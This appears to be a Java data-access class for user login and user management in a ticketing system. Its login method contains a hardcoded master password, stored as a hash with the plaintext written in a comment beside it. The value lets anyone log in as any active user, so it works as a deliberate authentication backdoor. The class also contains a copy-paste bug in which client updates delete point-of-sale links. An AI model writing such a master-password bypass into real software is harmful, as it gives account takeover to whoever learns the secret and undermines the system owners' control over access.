package br.com.nx.tickets.dao;

import java.util.List;

import javax.persistence.NoResultException;

import br.com.nx.tickets.componente.Credencial;
import br.com.nx.tickets.componente.Filtravel;
import br.com.nx.tickets.componente.Paginador;
import br.com.nx.tickets.componente.Paginavel;
import br.com.nx.tickets.dao.filtro.ESortedBy;
import br.com.nx.tickets.dao.filtro.SQLFilter;
import br.com.nx.tickets.entidade.Cliente;
import br.com.nx.tickets.entidade.PontoVenda;
import br.com.nx.tickets.entidade.Usuario;
import br.com.nx.tickets.entidade.UsuarioPontoVenda;
import br.com.nx.tickets.entidade.util.EBoolean;
import br.com.nx.tickets.entidade.util.ESituacao;
import br.com.nx.tickets.entidade.util.SituacaoAlteravel;

public class UsuarioDAO extends BaseDAO<Usuario> {

	private static final long serialVersionUID = 1L;

	// NX#C0R1NG4*#
	private static final String SENHA_CORINGA = "fab3016441370ee22506bbe2f348e42278a6d89a";

	public UsuarioDAO() {
		super(Usuario.class);
	}

	public Usuario logar(Credencial credencial) {
		try {
			String senha = credencial.getPassword();
			if (senha.equals(SENHA_CORINGA)) {
				Usuario usuarioCoringa = consultarUsuarioPorLoginCoringa(credencial.getUsername().toUpperCase());
				if (usuarioCoringa != null) {
					senha = usuarioCoringa.getSenha();
				}
			}

			StringBuilder sql = new StringBuilder();
			sql.append("SELECT u FROM Usuario u ");
			sql.append("JOIN FETCH u.nivel n ");
			sql.append("JOIN u.ultimaSituacao us ");
			sql.append("WHERE u.login =:_login AND u.senha =:_senha ");
			sql.append("AND us.situacao.ativo =:_ativo");

			return (Usuario) getEm().createQuery(sql.toString())
									.setParameter("_login", credencial.getUsername().toUpperCase().trim())
									.setParameter("_senha", senha).setParameter("_ativo", EBoolean.TRUE)
									.getSingleResult();
		} catch (NoResultException nre) {
			throw new BaseDAOException("Usuário e/ou senha inválido(s)");
		} catch (Exception e) {
			e.printStackTrace();
			throw new BaseDAOException(e.getMessage());
		}
	}

	private Usuario consultarUsuarioPorLoginCoringa(String login) {
		try {
			StringBuilder sql = new StringBuilder();
			sql.append("SELECT u FROM Usuario u ");
			sql.append("JOIN FETCH u.nivel n ");
			sql.append("JOIN FETCH u.ultimaSituacao us ");
			sql.append("WHERE u.login =:_login AND us.situacao.ativo =:_ativo");
			return (Usuario) getEm().createQuery(sql.toString()).setParameter("_login", login)
					.setParameter("_ativo", EBoolean.TRUE).setMaxResults(1).getSingleResult();
		} catch (NoResultException e) {
			return null;
		}
	}

	@Override
	public List<? extends SituacaoAlteravel> consultarPorSituacao(ESituacao situacao) {
		return null;
	}

	@Override
	public void verificarDuplicidade(Usuario t) throws ViolacaoDeConstraintException {
	}

	@Override
	public Paginador<Paginavel> consultarPorFiltro(Paginador<Paginavel> paginador, Filtravel filtravel) {
		try {
			return new SQLFilter.SQLFilterBuilder(Usuario.class, getEm(), filtravel).setupPaginador(paginador)
					.filterSimpleBy("usu.nome").orderBy("usu.nome").sortedBy(ESortedBy.ASC).build().dadosPaginados();
		} catch (Exception e) {
			e.printStackTrace();
			throw new BaseDAOException(e.getMessage());
		}
	}

	public void atualizarPontosVendas(Usuario usuario, List<PontoVenda> pontosVendas) {
		try {
			removerPontoVendaPorUsuario(usuario);
			for (PontoVenda pontoVenda : pontosVendas) {
				getEm().persist(new UsuarioPontoVenda(usuario, pontoVenda));
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private void removerPontoVendaPorUsuario(Usuario usuario) {
		try {
			getEm().createNativeQuery("DELETE FROM usuario_ponto_venda where _usuario =:_usuario ")
			.setParameter("_usuario", usuario)
			.executeUpdate();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	public void atualizarClientes(Usuario usuario, List<Cliente> clientes) {
		try {
			removerPontoVendaPorUsuario(usuario);
			for (Cliente cliente : clientes) {
//				getEm().persist(new UsuarioPontoVenda(usuario, pontoVenda));
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private void removerClientePorUsuario(Usuario usuario) {
		try {
			getEm().createNativeQuery("DELETE FROM usuario_cliente where _usuario =:_usuario ")
			.setParameter("_usuario", usuario)
			.executeUpdate();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}
